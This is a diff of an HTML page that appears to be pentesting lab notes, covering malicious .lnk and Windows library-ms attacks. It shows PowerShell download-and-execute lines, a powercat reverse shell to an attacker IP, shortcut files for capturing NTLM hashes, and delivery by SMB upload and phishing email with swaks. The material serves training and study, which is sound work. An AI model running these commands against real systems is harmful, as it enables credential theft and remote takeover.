@@ -27102,7 +27102,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <h4 id="running-monitor-script-on-target-host">Running Monitor Script on Target Host</h4>
 <p>We can host the script on our attack machine and execute it on the target host as follows.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a> IEX (iwr &#39;http://10.10.10.205/procmon.ps1&#39;) 
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a> IEX (iwr 'http://10.10.10.205/procmon.ps1') 
 </span></code></pre></div></td></tr></table></div>
 <p>This is successful and reveals the password for the <code>sqlsvc</code> domain user, which we could then possibly use to gain access to the SQL02 host or potentially find sensitive data such as database credentials on the <code>backups</code> share.</p>
 <p>Output: </p>
@@ -27183,12 +27183,12 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-9-6">6</a></span>
 <span class="normal"><a href="#__codelineno-9-7">7</a></span>
 <span class="normal"><a href="#__codelineno-9-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>$objShell = New-Object -ComObject WScript.Shell
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>$lnk = $objShell.CreateShortcut(&quot;C:\legit.lnk&quot;)
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>$lnk.TargetPath = &quot;\\&lt;attackerIP&gt;\@pwn.png&quot;
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>$lnk.TargetPath = "\\&lt;attackerIP&gt;\@pwn.png"
 </span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>$lnk.WindowStyle = 1
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>$lnk.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>$lnk.Description = &quot;Browsing to the directory where this file is saved will trigger an auth request.&quot;
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a>$lnk.HotKey = &quot;Ctrl+Alt+O&quot;
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a>$lnk.HotKey = "Ctrl+Alt+O"
 </span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a>$lnk.Save()
 </span></code></pre></div></td></tr></table></div>
 <p>So we create the following file audir.url. The goal for this file is creating a connection to our attacker smb share with the hope to capture an NTLM hash. The audit.url:</p>
@@ -27231,19 +27231,19 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-14-6">6</a></span>
 <span class="normal"><a href="#__codelineno-14-7">7</a></span>
 <span class="normal"><a href="#__codelineno-14-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>$objShell = New-Object -ComObject WScript.Shell
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>$lnk = $objShell.CreateShortcut(&quot;C:\legit.lnk&quot;)
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>$lnk.TargetPath = &quot;\\&lt;attackerIP&gt;\@pwn.png&quot;
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>$lnk.TargetPath = "\\&lt;attackerIP&gt;\@pwn.png"
 </span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4"></a>$lnk.WindowStyle = 1
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a>$lnk.IconLocation = &quot;%windir%\system32\shell32.dll, 3&quot;
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6"></a>$lnk.Description = &quot;Browsing to the directory where this file is saved will trigger an auth request.&quot;
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7"></a>$lnk.HotKey = &quot;Ctrl+Alt+O&quot;
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a>$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6"></a>$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7"></a>$lnk.HotKey = "Ctrl+Alt+O"
 </span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8"></a>$lnk.Save()
 </span></code></pre></div></td></tr></table></div>
 <h2 id="lnk-file-attack-capturing-hashes-with-a-malicious-lnk-file-part-2-generated-with-m-slinky">.lnk File Attack: Capturing Hashes with a Malicious .lnk File PART 2, generated with -M slinky</h2>
 <p>If a share has READ/WRITE access, then you can create a malicious.lnk by using the slinky module:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
 <span class="normal"><a href="#__codelineno-15-2">2</a></span>
-<span class="normal"><a href="#__codelineno-15-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>nxc smb $ip 0 -d nara-security.com -u &#39;guest&#39; -p &#39;&#39; -M slinky -o NAME=malicious SERVER=&#39;192.168.45.172&#39;
+<span class="normal"><a href="#__codelineno-15-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>nxc smb $ip 0 -d nara-security.com -u 'guest' -p '' -M slinky -o NAME=malicious SERVER='192.168.45.172'
 </span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>
 </span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a># Server is the attacker IP
 </span></code></pre></div></td></tr></table></div>
@@ -27288,8 +27288,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-18-16">16</a></span>
 <span class="normal"><a href="#__codelineno-18-17">17</a></span>
 <span class="normal"><a href="#__codelineno-18-18">18</a></span>
-<span class="normal"><a href="#__codelineno-18-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a><span class="nt">&lt;libraryDescription</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span><span class="nt">&gt;</span>
+<span class="normal"><a href="#__codelineno-18-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a><span class="nt">&lt;libraryDescription</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/windows/2009/library"</span><span class="nt">&gt;</span>
 </span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a><span class="nt">&lt;name&gt;</span>@windows.storage.dll,-34582<span class="nt">&lt;/name&gt;</span>
 </span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a><span class="nt">&lt;version&gt;</span>6<span class="nt">&lt;/version&gt;</span>
 </span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a><span class="nt">&lt;isLibraryPinned&gt;</span>true<span class="nt">&lt;/isLibraryPinned&gt;</span>
@@ -27312,7 +27312,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>If we re-open our file in Visual Studio Code, we find that a new tag appeared named <a href="https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-simplelocation">serialized</a>.  The tag contains base64-encoded information about the location of the url  tag. Additionally, the content inside the  url  tags has changed from http://192.168.45.184  to \192.168.45.184\DavWWWRoot. Windows tries to optimize the WebDAV connection information for the <a href="https://www.webdavsystem.com/server/access/windows">Windows WebDAV client</a> and therefore modifies it.</p>
 <h3 id="step-3-create-a-malicious-shortcut">Step 3: Create a malicious shortcut</h3>
 <p>The shortcut will contain the following command:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.157:8000/powercat.ps1&#39;); powercat -c 192.168.45.157 -p 4444 -e powershell&quot;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157:8000/powercat.ps1'); powercat -c 192.168.45.157 -p 4444 -e powershell"
 </span></code></pre></div></td></tr></table></div>
 <p>Right click in the Windows Desktop and select Create New Shortcut. Place the command in the Location of the item:</p>
 <p>![[mslibrary.png]]</p>
@@ -27323,7 +27323,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>We now have a our web dav server with both files.</p>
 <h3 id="step-5-prepare-the-setup">Step 5: Prepare the setup</h3>
 <p><strong>On one side</strong>, we have the malicious.lnk downloading powercat.ps1 from our kali:8000 and then we have the same file launching the execution of a reverse shell:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.184:8000/powercat.ps1&#39;); powercat -c 192.168.45.184 -p 4444 -e powershell&quot;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.184:8000/powercat.ps1'); powercat -c 192.168.45.184 -p 4444 -e powershell"
 </span></code></pre></div></td></tr></table></div>
 <p>So we need, a http listener in port 8000 serving powercat.ps1:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>python -m http.server 8000
@@ -27334,11 +27334,11 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="step-6-deliver-the-malicious-windows-library-file-to-the-victim">Step 6: Deliver the malicious windows library file to the victim</h3>
 <p>Via mail might be a way.</p>
 <p>Also via smbshare:</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>smbclient<span class="w">  </span>//192.168.174.195/share<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;put config.Library-ms&#39;</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>smbclient<span class="w">  </span>//192.168.174.195/share<span class="w"> </span>-c<span class="w"> </span><span class="s1">'put config.Library-ms'</span>
 </span></code></pre></div></td></tr></table></div>
 <p>A reverse shell open eventually.</p>
 <p>Another way to do it is via mail relay:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>sudo swaks -t jim@relia.com --from mark@relia.com -ap --attach @config.Library-ms --server 192.168.192.189 --body test.txt --header &quot;Subject: Urgent Configuration Setup&quot; --suppress-data
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>sudo swaks -t jim@relia.com --from mark@relia.com -ap --attach @config.Library-ms --server 192.168.192.189 --body test.txt --header "Subject: Urgent Configuration Setup" --suppress-data
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
